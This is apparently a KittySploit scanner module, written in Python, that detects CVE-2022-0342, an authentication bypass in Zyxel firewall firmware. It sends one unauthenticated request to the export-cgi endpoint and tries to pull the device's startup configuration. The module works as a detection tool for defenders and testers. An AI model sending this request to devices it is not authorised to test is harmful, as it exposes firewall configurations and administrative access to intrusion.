#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An authentication bypass vulnerability in the CGI program of Zyxel USG/ZyWALL series firmware versions 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel - Authentication Bypass Detection',
        'description': 'An authentication bypass vulnerability in the CGI program of Zyxel USG/ZyWALL series firmware versions 4.20 through 4.70, USG FLEX series firmware versions 4.50 through 5.20, ATP series firmware versions 4.32 through 5.20, VPN series firmware versions 4.30 through 5.20, and NSG series firmware versions V1.20 through V1.33 Patch 4, which could allow an attacker to bypass the web authentication and obtain administrative access of the device.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'zyxel', 'auth-bypass', 'router', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/gobysec/GobyVuls/blob/master/CVE-2022-0342.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0342',
            'https://www.zyxel.com/support/Zyxel-security-advisory-for-authentication-bypass-vulnerability-of-firewalls.shtml',
            'https://github.com/f1tao/awesome-iot-security-resource',
            'https://github.com/murchie85/twitterCyberMonitor',
        ],
        'cve': 'CVE-2022-0342',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/export-cgi?category=config&arg0=startup-config.conf', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('interface-name', 'saved at',)
        header_all = ('text/zyxel', 'attachment; filename=',)
        if (all(m in body for m in body_all)) and (all(m in headers for m in header_all)):
            self.set_info(
                severity='critical',
                reason="Zyxel - Authentication Bypass detected",
                path='/cgi-bin/export-cgi?category=config&arg0=startup-config.conf',
            )
            return True
        return False

